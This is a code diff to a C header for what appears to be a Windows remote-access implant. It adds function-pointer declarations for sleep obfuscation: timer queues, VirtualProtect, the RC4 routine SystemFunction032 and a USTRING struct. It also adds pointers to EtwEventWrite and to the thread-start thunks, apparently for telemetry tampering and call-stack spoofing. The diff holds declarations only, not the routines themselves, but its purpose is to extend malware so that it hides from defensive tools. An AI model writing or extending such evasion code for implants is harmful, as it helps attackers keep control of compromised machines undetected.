@@ -93,10 +93,14 @@ struct WINAPIFUNC
 	DECL_API(Sleep);
 	DECL_API(VirtualAlloc);
 	DECL_API(VirtualFree);
+	DECL_API(VirtualProtect);
 	DECL_API(WaitForSingleObject);
 	DECL_API(WaitNamedPipeA);
 	DECL_API(WideCharToMultiByte);
 	DECL_API(WriteFile);
+	DECL_API(CreateTimerQueue);
+	DECL_API(CreateTimerQueueTimer);
+	DECL_API(DeleteTimerQueue);
 	
 	// iphlpapi
 	DECL_API(GetAdaptersInfo);
@@ -111,6 +115,9 @@ struct WINAPIFUNC
 	DECL_API(DuplicateTokenEx);
 	DECL_API(CreateProcessAsUserA);
 	DECL_API(CreateProcessWithTokenW);
+
+	// advapi32 (sleep obfuscation)
+	LPVOID SystemFunction032;
 
 	// msvcrt
 #if defined(DEBUG)
@@ -142,10 +149,17 @@ struct WINAPIFUNC
 	DECL_API(bind);
 };
 
+struct USTRING {
+	DWORD Length;
+	DWORD MaximumLength;
+	PVOID Buffer;
+};
+
 struct NTAPIFUNC
 {
 	DECL_API(NtClose);
 	DECL_API(NtContinue);
+	DECL_API(NtWaitForSingleObject);
 	DECL_API(NtFreeVirtualMemory);
 	DECL_API(NtQueryInformationProcess);
 	DECL_API(NtQuerySystemInformation);
@@ -154,12 +168,16 @@ struct NTAPIFUNC
 	DECL_API(NtOpenThreadToken);
 	DECL_API(NtTerminateThread);
 	DECL_API(NtTerminateProcess);
+	DECL_API(NtFlushInstructionCache);
 	DECL_API(RtlGetVersion);
 	DECL_API(RtlExitUserThread);
 	DECL_API(RtlExitUserProcess);
 	DECL_API(RtlIpv4StringToAddressA);
 	DECL_API(RtlRandomEx);
 	DECL_API(RtlNtStatusToDosError);
+	LPVOID EtwEventWrite;
+	LPVOID BaseThreadInitThunk;
+	LPVOID RtlUserThreadStart;
 };
 
 extern SYSMODULES* SysModules;
